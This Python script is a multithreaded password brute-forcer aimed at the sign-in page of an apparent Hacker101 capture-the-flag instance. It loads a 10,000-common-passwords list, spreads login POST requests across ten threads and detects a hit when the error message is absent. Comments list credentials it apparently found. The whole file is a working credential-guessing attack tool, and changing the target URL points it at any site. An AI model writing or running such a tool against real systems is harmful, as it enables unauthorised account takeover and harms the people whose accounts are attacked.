import time
import pandas as pd
from bson.objectid import ObjectId
from time import perf_counter
from threading import Thread
import numpy
from datetime import datetime
from hashlib import sha256
import logging
from pymongo import MongoClient
from bson.objectid import ObjectId
from time import perf_counter
import logging
from datetime import datetime
import math
import requests
import sys
logging.basicConfig(level=logging.ERROR)

URL = ''
FILEPATH = './data/10k-most-common-passwords.txt'  # Replace with the path to your text file

# Example usage:
URL = 'https://5f013771277552d5b2ef242126630f7c.ctf.hacker101.com/index.php?page=sign_in.php'  # Replace with the actual URL

class Brute:

    def __init__(self):
        logging.info('... Brute Force X ... %s' % (time.time()))
        self.limit = 100
        self.sections = 10

        self.total_records = 0
        self.total_pages = 0
        self.rows = [] 
        self.total = 0
        self.payload = {}

    def __split__(self, ar):
        df = pd.DataFrame(ar)
        try:
            data = df.apply(lambda pages: self.__get_data__(pages), axis=1)
            return data
        except Exception as e:
            logging.error('Lambda Split Error %s' % e)
            raise e

    def __threads__(self, pages):
        sections = self.sections
        pages = numpy.array(pages)
        splitted = numpy.array_split(pages, sections, axis=0)
        threads = []
        for n in range(0, sections):
            ar = splitted[n]
            t = Thread(target=self.__split__, args=(ar,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    def __get_pages__(self, total_records):
        min_pages = 1
        if total_records <= self.limit:
            return [{'page':1, 'skip':0}]

        try:
            min_pages = math.ceil(int(total_records) / self.limit)
        except Exception as e:
            logging.error('Pagination error: %s' % e)
            raise e
        
        pages = []
        for i in range(0, min_pages):
            page = i + 1
            skip = self.limit * (page-1)
            data = total_records - skip
            data = data if data < self.limit else self.limit
            frm = skip
            too = skip + self.limit
            prev = self.rows[frm:too]
            pages.append({
                "page": str(page),
                "skip": str(skip),
                "data": data,
                "names": prev
            })
        self.total_pages    = len(pages)
        return pages

    def __count_data__(self, file_path):
        data = self.__read_file__(file_path)
        return len(data)
    
    def __paginated__(self, file_path):
        self.total_records = self.__count_data__(file_path)
        pages = self.__get_pages__(self.total_records)
        return pages

    def __make__request__(self, data):
        print('Making request', data)
        username = 'user'  
        for row in data:
            try:
                # Create a dictionary with the data to be sent in the POST request
                payload = {'username': username, 'password': row}
                # Send the POST request
                # time.sleep(1)
                # print('Response Status', payload, 200 )
                # return 200

                response = requests.post(URL, data=payload)
                if response.status_code == 200:
                    print('Response Status', row, response.status_code )
                    if "You've entered a wrong username/password combination" not in response.text:
                        print('\n\n\nHERE!!!!\n\n\n',row, response.text)
                        return sys.exit()
                else:
                    print(f"POST request failed with status code {response.status_code}")
                
                self.total += 1

            except Exception as e:
                print(f"An error occurred: {e}")

    def __get_data__(self, pages):
        for page in pages:
            print('get data',  page['names'])
            data = self.__make__request__(page['names'])
        return data
    
    def __read_file__(self, file_path):
        data = []
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    data.append(line.strip())
        except FileNotFoundError:
            print(f"The file '{file_path}' was not found.")
        except Exception as e:
            print(f"An error occurred: {e}")   

        self.rows = data     
        return data

    def __start__(self, file_path):
        self.process_time = perf_counter()
        pages = self.__paginated__(file_path)
        print(f'Total Pages {len(pages)} rows:{len(self.rows)}')
        print('Total Records', self.total_records)
        self.__threads__(pages)
        self.success = True
        print(f'Total request {self.total}')
        return self
    
    def set_payload(self, **kwargs):
        payload = kwargs.get('payload')
        result = {}
        for key in payload:
            if isinstance(payload[key], str):
                print('IS String')
                result[key] = payload[key]
            
            if isinstance(payload[key], dict):
                print('Is Dict')
                if 'path' in payload[key]:
                    result[key] = self.__read_file__(payload[key])

        return result

# - FOUND -
# moina
# scamper

brute = Brute()

# load_data = brute.set_payload(
#     payload={
#         "username": "moina", 
#         "password": {
#             'path': FILEPATH, 
#             'override': True, 
#         }
#     },
# )

pages = brute.__start__(FILEPATH)

print('Done')